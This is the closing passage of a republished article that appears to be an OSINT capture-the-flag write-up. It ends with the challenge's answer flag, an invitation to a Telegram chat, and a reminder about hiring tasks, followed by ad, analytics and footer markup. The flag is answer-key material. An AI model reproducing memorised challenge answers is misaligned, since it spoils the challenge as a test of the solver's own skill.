</p><br><p>  <strong>Answer:</strong> <em>ctfzone {3245c702f66816ca086a730c6baa5e16}</em> </p><br><p>  Now you know almost everything.  Stay with us, and very soon we will reveal to you the latest secret about investigations in open sources.  In the meantime, you can discuss a new Ritep and ask a couple of questions in <a href="https://telegram.me/joinchat/Aj-l2UC2XdOvF_ogMsQE0w">our chat in the telegraph</a> and in the comments to the post. </p><br><p>  We remind you that you still have time to try your hand at the tasks on the hiring <a href="https://tasks.bi.zone/">here</a> , they will be available until 15.12.  Good luck! </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/317422/">https://habr.com/ru/post/317422/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../317406/index.html">Export key SignalCom to OpenSSL</a></li>
<li><a href="../317408/index.html">Fear and loathing in a single startup. Part 2 - Hate</a></li>
<li><a href="../317412/index.html">Mitap RDSFront & # 1</a></li>
<li><a href="../317418/index.html">Overview of Extreme Networks online stacking tools</a></li>
<li><a href="../317420/index.html">NetGear routers are vulnerable</a></li>
<li><a href="../317426/index.html">Monitoring Microsoft SQL Server "on the knee"</a></li>
<li><a href="../317428/index.html">Clouds like love</a></li>
<li><a href="../317430/index.html">CSS selectors in the showroom</a></li>
<li><a href="../317432/index.html">How to become an Oracle Certified Professional Java SE 8 Programmer</a></li>
<li><a href="../317434/index.html">Assassin's Creed III mission design lessons in the open world</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>